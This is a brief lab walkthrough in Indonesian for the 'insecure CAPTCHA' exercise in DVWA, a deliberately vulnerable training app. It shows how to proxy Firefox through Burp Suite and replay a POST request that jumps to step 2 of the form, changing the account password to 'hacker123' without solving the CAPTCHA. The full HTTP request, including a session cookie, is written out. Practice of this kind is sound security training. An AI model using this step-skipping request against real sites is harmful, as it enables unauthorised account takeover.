## buka firefox kali linux, ke setting cari netwok settings lalu setting. ubah ke "manual proxy configurations" tujuannya untuk mencegat(intercept) dan memodifikasi request HTTP yang dikirim browser sebelum sampai ke server target.
## buka burpsuite, ke repeater untuk memodif request dan passwordnya
```bash
POST /dvwa/vulnerabilities/captcha/ HTTP/1.1
Host: 192.168.68.169
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Cookie: PHPSESSID=p0e7iunal78qihtant659o1hn; security=low

step=2&password_new=hacker123&password_conf=hacker123&Change=Change
```
## lalu send request tersebut dan otomatis passwordnya sudah diubah
## login dengan password yang sudah diubah

